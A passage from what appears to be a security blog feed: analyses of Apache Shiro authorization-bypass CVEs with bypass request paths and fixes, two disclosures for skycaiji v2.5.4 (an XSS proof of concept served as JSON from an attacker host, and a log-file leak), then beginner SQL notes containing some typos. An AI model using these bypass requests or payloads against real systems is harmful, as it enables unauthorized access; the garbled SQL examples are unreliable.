<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/868513d2-f270-4d09-8671-3507bdf8ee4c.png" alt="17523_3.png"><br>这样就导致与<code>shiro</code>中的配置本意想违背，导致绕过。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/625f64c6-5fbe-4486-99a0-7cfa10ee6ccd.png" alt="17523_4.png"><br>然后在<code>Spring</code>中的处理时，<code>uri</code>又包含空格，这样就能访问到<code>/hello/%20</code>页面<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/bb3a6c8c-00a6-4af7-a5e6-7ab35dc65d5c.png" alt="17523_5.png"></p>
<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在<a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160#diff-ce9ba3462f7d76e68c79bec5b9a3aea9bbd0d22ffb5e738f1b621cae49037b92">Commit</a>中，主要修复点<code>AntPathMatcher.java</code>，在<code>tokenizeToStringArray</code>方法中加了<code>false</code>和<code>true</code>两个参数<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/a282c0fc-69ae-433b-a6c8-05dcbc20b600.png" alt="17523_6.png"><br>可以看到，当第三个参数为<code>false</code>时，即<code>trimTokens</code>为<code>false</code>，此时就不会对<code>token</code>进行<code>trim</code>。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8162061b-91f6-4493-a28f-1b6ec77dc935.png" alt="17523_7.png"></p>
<h2 id="Apache-shiro-认证机制不恰当-CVE-2021-41303"><a href="#Apache-shiro-认证机制不恰当-CVE-2021-41303" class="headerlink" title="Apache shiro 认证机制不恰当 CVE-2021-41303"></a>Apache shiro 认证机制不恰当 CVE-2021-41303</h2><h3 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303">CVE-2021-41303</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-825">SHIRO-825</a><br>影响版本：<code>shiro &lt; 1.8.0</code><br>漏洞描述：<code>1.8.0</code> 之前的 <code>Apache Shiro</code>，在 <code>Spring Boot</code> 中使用 <code>Apache Shiro</code> 时，特制的 <code>HTTP</code> 请求可能会导致身份验证绕过。用户应该更新到 <code>Apache Shiro 1.8.0</code>。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit</a><br>参考：[threedr3am师傅](<a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）/)</p>
<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据[threedr3am师傅](<a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）/)博客提供的方向，看了一下Shiro 1.7.1前后<code>PathMatchingFilterChainResolver#getChain</code>的对比<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/34482161-0e41-4509-8846-0ba4f4f2d925.png" alt="41303_1.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1eefa238-5dc2-44f5-bf79-a2b7e1044e13.png" alt="41303_2.png"><br>发现在<code>1.7.1</code>版本中，先是对pathPattern和requestURI进行比较，比较成功，返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, pathPattern);</span><br></pre></td></tr></table></figure>

<p>否则对删除尾部斜线的pathPattern和requestURI进行比较，比较成功，跳出循环，返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br></pre></td></tr></table></figure>

<p>但是正常访问，都会返回第一个<code>proxy</code>，什么时候才能绕过第一个比较并符合第二个比较呢？<br>可以看到，两者差别是对<code>uri</code>尾部斜线的处理，所以当在<code>uri</code>尾部加一个<code>/</code>，就会进入第二种比较方式。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7d24e50b-369c-417e-83f3-e38af9b5cede.png" alt="41303_3.png"><br>结合之前的多次调试再根据<code>threedr3am师傅</code>博客中的认证，可以知道<code>shiro</code>的认证鉴权会根据配置的先后顺序去依次实施<br>所以当我有如下配置时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;/admin/*&quot;, &quot;authc&quot;);</span><br><span class="line">map.put(&quot;/admin/page&quot;, &quot;anon&quot;);</span><br></pre></td></tr></table></figure>

<p>循环中先匹配到<code>/admin/*</code>（这里是通过<code>while</code>语句对去除尾部斜线的<code>uri</code>进行匹配）,然后跳出循环，进入到<code>filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</code>，注意，这里真正的参数就是去除尾部斜线的<code>uri</code>，也就是<code>/admin/page</code>，所以在<code>DefaultFilterChainManager#getChain</code>中得到的权限是<code>anon</code>，这样就达到绕过目的。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8fce53b6-4b73-4bfa-9850-0c6055002ee9.png" alt="41303_4.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2b221bea-61b9-4b92-bed2-0d9e46c72b3d.png" alt="41303_5.png"></p>
<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>直接将<code>filterChainManager.proxy</code>的第二个参数改为<code>pathPattern</code>，直接传配置中的<code>uri</code>了<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5f9451d4-7b15-401e-8f74-8de4feca30a0.png" alt="41303_6.png"></p>
<h2 id="Apache-Shiro-RegExPatternMatcher-权限绕过漏洞-CVE-2022-32532"><a href="#Apache-Shiro-RegExPatternMatcher-权限绕过漏洞-CVE-2022-32532" class="headerlink" title="Apache Shiro RegExPatternMatcher 权限绕过漏洞 CVE-2022-32532"></a>Apache Shiro RegExPatternMatcher 权限绕过漏洞 CVE-2022-32532</h2><h3 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532">CVE-2022-32532</a><br>影响版本：<code>shiro &lt; 1.9.1</code><br>漏洞描述：在<code>1.9.1</code>之前的<code>Apache Shiro</code>中，<code>RegexRequestMatcher</code>可能会被错误配置，从而在某些<code>servlet</code>容器上被绕过。应用程序使用<code>RegExPatternMatcher</code>与<code>.</code>的正则表达式可能容易被授权绕过。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit</a><br>参考：<a href="https://xz.aliyun.com/t/11501">4ra1n师傅</a></p>
<p>###漏洞分析</p>
<p>这是最新的一个洞，看<code>Shiro</code>发布的<a href="https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh">公告</a>显示，是由于<code>RegexRequestMatcher</code>的错误配置导致的问题。<br>简单了解了一下，<code>RegexRequestMatcher</code>和<code>AntPathMatcher</code>类似，都是<code>Shiro</code>用于路径匹配的配置，只是<code>RegexRequestMatcher</code>需要用户自己配置。<br>根据<a href="https://xz.aliyun.com/t/11501">4ra1n师傅</a>的分析，可以知道，正常正则表达式<code>.</code>并不包含<code>\r</code>和<code>\n</code>字符<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9b627557-b347-4095-99f7-582738349065.png" alt="32532_1.png"><br>修改成如下代码就可修复问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// flag为Pattern.DOTALL时，表达式 .可以匹配任何字符，包括行结束符。</span><br><span class="line">Pattern pattern = Pattern.compile(regex,Pattern.DOTALL);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/efdd198e-cc6f-4ac8-81ad-72ddd25bf830.png" alt="32532_2.png"><br>那么回头看一下<code>RegexRequestMatcher</code>用于匹配的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean matches(String pattern, String source) &#123;</span><br><span class="line">    if (pattern == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;pattern argument cannot be null.&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Pattern p = Pattern.compile(pattern);</span><br><span class="line">        Matcher m = p.matcher(source);</span><br><span class="line">        return m.matches();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，当<code>pattern</code>存在带<code>.</code>的正则表达式并且<code>source</code>中存在<code>\r</code>或<code>\n</code>字时，此时判断错误。<br>此时我们在配置完<code>RegexRequestMatcher</code>之后增加如下<code>Controller</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(path = &quot;/alter/&#123;value&#125;&quot;)</span><br><span class="line">public String alter(@PathVariable String value) &#123;</span><br><span class="line">    System.out.println(&quot;绕过成功&quot;);</span><br><span class="line">    return &quot;绕过成功&quot;+value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加如下配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//myFilter.java中设置成需要权限</span><br><span class="line">manager.addToChain(&quot;/alter/.*&quot;, &quot;myFilter&quot;);</span><br></pre></td></tr></table></figure>

<p>这样正常访问<code>/alter/aaa</code>是被拒绝的，但是当访问<code>/alter/a%0aaa</code>或<code>/alter/a%0daa</code>时就会绕成验证，访问成功<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/84751d4e-fd08-4c6e-a6f2-60e41ec2babb.png" alt="32532_3.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/98821af8-63f5-43fd-bc20-3332010ca225.png" alt="32532_4.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/c154f8b3-8978-4f53-8398-1603e4eda3e1.png" alt="32532_6.png"><br>这个洞限制还是比较多的，既要服务器配置了<code>RegExPatternMatcher</code>，又要设置带有<code>.</code>的正则表达式</p>
<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在<a href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit</a>可以看到，对<code>compile</code>方法设置了<code>flag</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4de30f7e-54df-4933-9dfd-e590d5401135.png" alt="32532_5.png"></p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>skycaiji-v2.5.4 has a backend xss vulnerability</title>
    <url>/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/</url>
    <content><![CDATA[<h1 id="skycaiji-v2-5-4-has-a-backend-xss-vulnerability"><a href="#skycaiji-v2-5-4-has-a-backend-xss-vulnerability" class="headerlink" title="skycaiji-v2.5.4 has a backend xss vulnerability"></a>skycaiji-v2.5.4 has a backend xss vulnerability</h1><p>Firstly, you can download the source code from the following website</p>
<p><code>https://down.chinaz.com/api/index/download?id=38972&amp;type=code</code></p>
<p>Directly place it in the root directory of the website, access the server IP, and follow the prompts to install</p>
<p>After installation, log in to the backend.</p>
<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232501330.png" alt="image-20230502232501330"></p>
<p>Click to the above function point</p>
<p>This is a JSON parsing function, but there is no complete xss protection in place.</p>
<p>We can construct a file that returns the JSON format ourselves, then access it, and return it to the JSON format with xss to trigger the xss code in the background.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John  &lt;img src=\&#x27;x\&#x27; onerror=\&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\&quot;&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;johndoe@example.com&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$json</span> = json_encode(<span class="variable">$data</span>);</span><br><span class="line"> </span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$json</span>;</span><br></pre></td></tr></table></figure>

<p>This string of code will return a JSON data with malicious payload.</p>
<p>We will deploy it on our own VPS and induce the backend administrator to parse its data, and we will find that the successful triggering of the xss code</p>
<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232849580.png" alt="image-20230502232849580"></p>
<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-backend-xss-vulnerability/image-20230502232855722.png" alt="image-20230502232855722"></p>
<p>Attackers can use this vulnerability to do anything that JavaScript code can do</p>
]]></content>
      <categories>
        <category>-cve</category>
      </categories>
  </entry>
  <entry>
    <title>skycaiji-v2.5.4 has a thinkphp log leak vulnerability</title>
    <url>/2023/05/02/skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability/</url>
    <content><![CDATA[<h1 id="skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability"><a href="#skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability" class="headerlink" title="skycaiji-v2.5.4 has a thinkphp log leak vulnerability"></a>skycaiji-v2.5.4 has a thinkphp log leak vulnerability</h1><p>You can get the source code from here</p>
<p><code>https://down.chinaz.com/api/index/download?id=38972&amp;type=code</code></p>
<p>Directly place it in the root directory of the website, access the server IP, and follow the prompts to install</p>
<p>After installation, it can be found that there is a thinkphp log file in this directory</p>
<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability/image-20230502210711184.png" alt="image-20230502210711184"></p>
<p>Attackers can directly obtain website log files by traversing directories</p>
<p><img src="/2023/05/02/skycaiji-v2-5-4-has-a-thinkphp-log-leak-vulnerability/image-20230502210726552.png" alt="image-20230502210726552"></p>
<p>Attackers can obtain sensitive information such as backend addresses and administrator accounts through this method.</p>
]]></content>
      <categories>
        <category>-cve</category>
      </categories>
  </entry>
  <entry>
    <title>sql必知必会</title>
    <url>/2022/01/11/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/</url>
    <content><![CDATA[<h1 id="sql必知必会"><a href="#sql必知必会" class="headerlink" title="sql必知必会"></a>sql必知必会</h1><h1 id="第一课-了解sql"><a href="#第一课-了解sql" class="headerlink" title="第一课 了解sql"></a>第一课 了解sql</h1><p>数据库（database）</p>
<p>表（table）储存在表中的数据时同一种类型的数据或清单</p>
<p>列（column）</p>
<p>行（row）</p>
<h2 id="1-1主键-primart-key"><a href="#1-1主键-primart-key" class="headerlink" title="1.1主键 primart key"></a>1.1主键 primart key</h2><p>表中每一行都应该有一列可以唯一标识自己。</p>
<p>主键值能够唯一标识表中的每一行。</p>
<p>注：主键列不允许null，不允许修改或更新，不能重用。</p>
<h1 id="第二课-检索数据"><a href="#第二课-检索数据" class="headerlink" title="第二课 检索数据"></a>第二课 检索数据</h1><h2 id="2-1SELECT语句"><a href="#2-1SELECT语句" class="headerlink" title="2.1SELECT语句"></a>2.1SELECT语句</h2><h3 id="2-1-1检索单列"><a href="#2-1-1检索单列" class="headerlink" title="2.1.1检索单列"></a>2.1.1检索单列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> prod <span class="keyword">from</span> products;</span><br><span class="line">#意为从表products中查询prod列</span><br></pre></td></tr></table></figure>

<p>提示：结合sql语句</p>
<p>多条sql语句必须以分号(;)分隔，并且sql语句不区分大小写。</p>
<h3 id="2-1-2检索多列"><a href="#2-1-2检索多列" class="headerlink" title="2.1.2检索多列"></a>2.1.2检索多列</h3><p>与单列相同，列名之间必须以逗号分隔，但是在最后一个列名的后面不加，否则会报错。</p>
<h3 id="2-1-3检索所有列"><a href="#2-1-3检索所有列" class="headerlink" title="2.1.3检索所有列"></a>2.1.3检索所有列</h3><p>在实际列名的位置使用星号通配符可以做到这点。</p>
<h3 id="2-1-4检索不同值"><a href="#2-1-4检索不同值" class="headerlink" title="2.1.4检索不同值"></a>2.1.4检索不同值</h3><p>想要返回不同的值，在列名前直接用distinct，则不会返回重复的数值。</p>
<h3 id="2-1-5top关键字"><a href="#2-1-5top关键字" class="headerlink" title="2.1.5top关键字"></a>2.1.5top关键字</h3><p>在SQLserver中使用SELECT时，可以用TOP关键字来限制最多返回多少行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> top <span class="number">5</span> prod_name FORM prducts;</span><br><span class="line">#检索products表中前五个列</span><br></pre></td></tr></table></figure>

<h3 id="2-1-6LIMIT关键字"><a href="#2-1-6LIMIT关键字" class="headerlink" title="2.1.6LIMIT关键字"></a>2.1.6LIMIT关键字</h3><p>如果使用mysql，mariaDB，postgresql，则用LIMIT关键字来限制</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> top <span class="number">5</span> prod_name FORM prducts LIMIT <span class="number">5</span>;</span><br><span class="line">#只返回五行数据</span><br><span class="line"><span class="keyword">SELECT</span> top <span class="number">5</span> prod_name FORM prducts LIMIT <span class="number">5</span> <span class="keyword">OFFSET</span> <span class="number">4</span>;</span><br><span class="line">#从第四行开始返回五行数据</span><br></pre></td></tr></table></figure>

<h1 id="第三课-排列数据"><a href="#第三课-排列数据" class="headerlink" title="第三课 排列数据"></a>第三课 排列数据</h1><h3 id="3-1-1ORDER-BY关键字"><a href="#3-1-1ORDER-BY关键字" class="headerlink" title="3.1.1ORDER BY关键字"></a>3.1.1ORDER BY关键字</h3><p>在SELECT语句最后使用，ORDER BY，对order by后面的列进行排序（列名之间用逗号分开），其后加数字也可以（相对列位置）。</p>
<h1 id="第四课-过滤数据"><a href="#第四课-过滤数据" class="headerlink" title="第四课 过滤数据"></a>第四课 过滤数据</h1><h2 id="4-1使用WHERE子句"><a href="#4-1使用WHERE子句" class="headerlink" title="4.1使用WHERE子句"></a>4.1使用WHERE子句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sex <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> username<span class="operator">=</span> <span class="string">&#x27;allen&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>分析 这条语句从menber表中检索了 username为allen那一行的sex列。</p>
<h2 id="4-2where子句的操作符"><a href="#4-2where子句的操作符" class="headerlink" title="4.2where子句的操作符"></a>4.2where子句的操作符</h2><p>有大于小于以及取非!，还有两个比较特殊的”BETWEEN AND”  “IS NULL”。就像是python里的if一样，输出满足条件的那一行。</p>
<h1 id="第五课-高级数据过滤"><a href="#第五课-高级数据过滤" class="headerlink" title="第五课 高级数据过滤"></a>第五课 高级数据过滤</h1><h2 id="5-1组合WHERE子句"><a href="#5-1组合WHERE子句" class="headerlink" title="5.1组合WHERE子句"></a>5.1组合WHERE子句</h2><h3 id="5-1-1AND操作符"><a href="#5-1-1AND操作符" class="headerlink" title="5.1.1AND操作符"></a>5.1.1AND操作符</h3><p>要通过不知一个列进行过滤，可以使用AND操作符给WHERE子句附加条件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sex <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> username<span class="operator">=</span> <span class="string">&#x27;allen&#x27;</span> <span class="keyword">AND</span> address <span class="operator">=</span> <span class="string">&#x27;nba 76&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="5-1-2OR操作符"><a href="#5-1-2OR操作符" class="headerlink" title="5.1.2OR操作符"></a>5.1.2OR操作符</h3><p>就和其他的编程语言一样，or也是或运算。许多dbms在OR WHERE子句的第一个条件得到满足的情况下就不会计算第二个条件了。</p>
<h3 id="5-1-3运算顺序"><a href="#5-1-3运算顺序" class="headerlink" title="5.1.3运算顺序"></a>5.1.3运算顺序</h3><p>and的优先级是大于or的</p>
<h2 id="5-2-IN操作符"><a href="#5-2-IN操作符" class="headerlink" title="5.2 IN操作符"></a>5.2 IN操作符</h2><p>IN操作符用来指定条件的范围，范围中的每个条件都可以进行匹配。IN取一组由逗号分隔、括在圆括号中的合法值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">#这个语句会找到id为<span class="number">1</span>和<span class="number">3</span>的数据，并不是开区间的意思，比起<span class="keyword">or</span>更加简洁明了，执行起来也更加快捷。</span><br></pre></td></tr></table></figure>



<h2 id="5-3NOT操作符"><a href="#5-3NOT操作符" class="headerlink" title="5.3NOT操作符"></a>5.3NOT操作符</h2><p>WHERE子句中的NOT操作符有且仅有一个功能，那就是否定其后所跟的任何条件。 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> <span class="keyword">NOT</span>  id <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">#检索id不是<span class="number">1</span>和<span class="number">3</span>的数据。</span><br></pre></td></tr></table></figure>

<h1 id="第六课-用通配符进行过滤"><a href="#第六课-用通配符进行过滤" class="headerlink" title="第六课 用通配符进行过滤"></a>第六课 用通配符进行过滤</h1><p>通配符（wildcard）:用来匹配值的一部分的特殊字符</p>
<p>搜索模式(search pattern):由字面值、通配符或两者组合构成的搜索条件。</p>
<h2 id="6-1-LIKE操作符"><a href="#6-1-LIKE操作符" class="headerlink" title="6.1 LIKE操作符"></a>6.1 LIKE操作符</h2><h3 id="6-1-1-百分号-通配符"><a href="#6-1-1-百分号-通配符" class="headerlink" title="6.1.1 百分号%通配符"></a>6.1.1 百分号%通配符</h3><p>最常使用的通配符，%表示任何字符出现任意次数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">LIKE</span> <span class="string">&#x27;L%&#x27;</span>;</span><br><span class="line">#检索username以l开头的的行</span><br></pre></td></tr></table></figure>

<h3 id="6-1-2下划线-通配符"><a href="#6-1-2下划线-通配符" class="headerlink" title="6.1.2下划线_通配符"></a>6.1.2下划线_通配符</h3><p>下划线的作用和百分号一样，但是它只匹配单个字符而不是多个字符。</p>
<h3 id="6-1-3方括号-通配符"><a href="#6-1-3方括号-通配符" class="headerlink" title="6.1.3方括号[]通配符"></a>6.1.3方括号[]通配符</h3><p>方括号通配符用来指定一个字符集，他必须匹配指定位置(通配符的位置)的一个字符。</p>
<p>注意:并不是所有都支持集合，sqlserver支持，但是mysql，Oracle，db2，sqlite都不支持</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">like</span> &quot;[jm]%&quot;</span><br><span class="line">#找出所有名字以j或者m开头的成员</span><br></pre></td></tr></table></figure>

<h1 id="第七课-创建计算字段"><a href="#第七课-创建计算字段" class="headerlink" title="第七课 创建计算字段"></a>第七课 创建计算字段</h1><h2 id="7-1计算字段"><a href="#7-1计算字段" class="headerlink" title="7.1计算字段"></a>7.1计算字段</h2><p>储存在数据库表中的数据一般不是应用程序所需要的的格式，这就是计算字段可以派上用场的地方了。与前几课介绍的列不同，计算字段并不实际存在于数据库中。计算字段是运行时在SELECT语句内创建的。</p>
<h2 id="7-2拼接字段"><a href="#7-2拼接字段" class="headerlink" title="7.2拼接字段"></a>7.2拼接字段</h2><p>在不同的DBMS中会使用不同的拼接符号，大部分是+ 有些是||</p>
<p>例子：拼接由两列组成的标题。</p>
<p><img src="/2022/01/11/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/image-20220110211300133.png" alt="image-20220110211300133"></p>
<p><img src="/2022/01/11/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/image-20220110211308998.png" alt="image-20220110211308998"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> age <span class="operator">+</span> username <span class="keyword">FROM</span> <span class="keyword">Member</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uername</span><br></pre></td></tr></table></figure>

<h3 id="7-2-1补充-去除空格的函数"><a href="#7-2-1补充-去除空格的函数" class="headerlink" title="7.2.1补充 去除空格的函数"></a>7.2.1补充 去除空格的函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rtrim(列名)去除右边的空格</span><br><span class="line">ltrim(列名)去除左边的空格</span><br><span class="line"><span class="built_in">trim</span>(列名)去除两边的空格</span><br></pre></td></tr></table></figure>

<h2 id="7-3使用别名"><a href="#7-3使用别名" class="headerlink" title="7.3使用别名"></a>7.3使用别名</h2><p>select语句可以很好的拼接两个地址字段。但是这个新计算列的并没有名字，他只是一个值，我们可以用AS关键字给他赋予别名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> rtrim(age <span class="operator">+</span> username) <span class="keyword">AS</span> totl <span class="keyword">FROM</span> <span class="keyword">Member</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uername</span><br></pre></td></tr></table></figure>

<h2 id="7-4执行算数计算"><a href="#7-4执行算数计算" class="headerlink" title="7.4执行算数计算"></a>7.4执行算数计算</h2><p>计算字段的另一常见用途是对检索出的数据进行算术计算。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> quantity,price,quantity<span class="operator">*</span>price <span class="keyword">AS</span> final_price <span class="keyword">FROM</span> <span class="keyword">order</span>;</span><br><span class="line">#计算总的价格之后输出</span><br></pre></td></tr></table></figure>

<h1 id="8-使用函数处理数据"><a href="#8-使用函数处理数据" class="headerlink" title="8.使用函数处理数据"></a>8.使用函数处理数据</h1><h2 id="8-1使用函数"><a href="#8-1使用函数" class="headerlink" title="8.1使用函数"></a>8.1使用函数</h2><p>大多数sql实现支持一下函数：</p>
<p>用于处理文本字符串的文本函数，用于在数值计算上的算数操作函数，用于处理日期和时间值并从这些值中提取特定数值的日期和时间函数，用于生产美观好动的输出内容的格式化函数，返回dbms特殊信息的函数。</p>
<h3 id="8-1-1文本处理函数"><a href="#8-1-1文本处理函数" class="headerlink" title="8.1.1文本处理函数"></a>8.1.1文本处理函数</h3><p>UPPER()输出转化为大写</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">upper</span>(username) <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p>下面介绍常用的文本处理函数</p>
